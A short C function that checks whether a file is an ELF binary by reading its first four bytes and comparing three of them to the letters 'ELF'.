/* Is it ELF? */
int Is_ELF(FILE *fd)
{
   char elf_sign[4];

   /* Reads the first 4 bytes */
  fread(elf_sign,4,1,fd);

  if(elf_sign[1] == 'E' && elf_sign[2] == 'L'
       && elf_sign[3] == 'F')
       {
          return 1; /* Good ELF ! */
       }

  return 0; /* Not an ELF */
}
